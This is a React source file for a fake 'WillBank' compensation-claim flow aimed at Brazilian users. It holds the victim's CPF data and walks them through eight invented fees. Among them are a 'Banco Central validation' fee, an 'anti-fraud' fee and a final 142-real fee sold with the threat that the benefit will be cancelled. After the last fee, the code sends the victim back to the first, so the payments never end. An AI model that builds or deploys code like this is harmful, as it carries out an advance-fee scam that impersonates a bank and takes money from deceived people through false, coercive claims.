import { useEffect } from "react";
import { useNavigate, useLocation, useParams } from "react-router-dom";
import WillBankHeader from "@/components/WillBankHeader";
import WillBankFooter from "@/components/WillBankFooter";
import UpsellStep from "@/components/UpsellStep";
import { CPFData } from "@/lib/cpf";
import { getSession, saveSession } from "@/hooks/useSessionPersistence";
import { buildUrlWithUtm } from "@/hooks/useUtmTracking";

// Define the 7 upsells with their values and descriptions
const UPSELLS = [
  {
    valor: 14.21,
    title: "Taxa de Processamento Prioritário",
    description: "Garanta processamento prioritário da sua indenização e receba antes dos demais beneficiários.",
  },
  {
    valor: 32.98,
    title: "Seguro de Transferência Bancária",
    description: "Proteja sua transferência contra falhas e garanta que o valor chegue com segurança total.",
  },
  {
    valor: 21.30,
    title: "Taxa de Validação Bancária",
    description: "Validação obrigatória junto ao Banco Central para liberação de valores acima de R$ 5.000,00.",
  },
  {
    valor: 28.83,
    title: "Certificado Digital de Autenticidade",
    description: "Documento digital que comprova a autenticidade e legalidade da sua indenização.",
  },
  {
    valor: 13.23,
    title: "Taxa de Liberação Imediata",
    description: "Libere sua indenização imediatamente sem aguardar o prazo padrão de processamento.",
  },
  {
    valor: 11.00,
    title: "Proteção Anti-Fraude Premium",
    description: "Sistema avançado de proteção que garante a segurança total da sua transação.",
  },
  {
    valor: 8.83,
    title: "Taxa de Finalização",
    description: "Última etapa para conclusão do processo e liberação definitiva da sua indenização.",
  },
  {
    valor: 142.00,
    title: "Taxa de Homologação Final",
    description: "ATENÇÃO: Esta é a taxa obrigatória de homologação junto ao Banco Central. Sem o pagamento desta taxa, seu benefício será CANCELADO e você NÃO receberá nenhum valor. Esta é a última etapa para garantir o recebimento da sua indenização.",
  },
];

const Upsell = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { step } = useParams<{ step: string }>();
  
  // Parse step number (1-7), default to 1. Handle NaN case.
  const parsedStep = parseInt(step || "1", 10);
  const stepNumber = isNaN(parsedStep) ? 1 : Math.min(Math.max(parsedStep, 1), 8);
  const currentIndex = stepNumber - 1;
  const currentUpsell = UPSELLS[currentIndex];

  // Try to get data from location state or session
  const session = getSession();
  const cpfData: CPFData | undefined = location.state?.cpfData || session?.cpfData;
  const valorBeneficio: number | undefined = location.state?.valorBeneficio || session?.valorBeneficio;
  const protocolo: string | undefined = location.state?.protocolo || session?.protocolo;

  // Scroll to top on step change
  useEffect(() => {
    window.scrollTo(0, 0);
  }, [stepNumber]);

  // Redirect if no data
  useEffect(() => {
    if (!cpfData || !valorBeneficio) {
      navigate("/");
      return;
    }

    // Save session with current upsell step
    saveSession({ 
      cpfData, 
      currentStep: `/upsell/${stepNumber}`, 
      valorBeneficio, 
      protocolo 
    });
  }, [cpfData, valorBeneficio, protocolo, navigate, stepNumber]);

  const handlePaymentConfirmed = () => {
    const stateData = {
      cpfData,
      valorBeneficio,
      protocolo,
    };

    if (stepNumber < 8) {
      // Navigate to next upsell page
      navigate(buildUrlWithUtm(`/upsell/${stepNumber + 1}`), { state: stateData });
    } else {
      // After upsell 8, go back to upsell 1
      navigate(buildUrlWithUtm("/upsell/1"), { state: stateData });
    }
  };

  if (!cpfData || !valorBeneficio) return null;

  return (
    <div className="min-h-screen min-h-[100dvh] bg-background flex flex-col">
      <WillBankHeader 
        userName={cpfData.nome.split(' ')[0].toUpperCase()} 
        breadcrumb={`Benefício > Indenização > Etapa ${stepNumber}/8`}
      />

      <main className="flex-1 flex items-center justify-center p-3 sm:p-6">
        <UpsellStep
          key={stepNumber}
          title={currentUpsell.title}
          description={currentUpsell.description}
          valor={currentUpsell.valor}
          cpfData={cpfData}
          protocolo={protocolo || `WB${Date.now()}`}
          onPaymentConfirmed={handlePaymentConfirmed}
          stepNumber={stepNumber}
          totalSteps={8}
        />
      </main>

      <WillBankFooter />
    </div>
  );
};

export default Upsell;
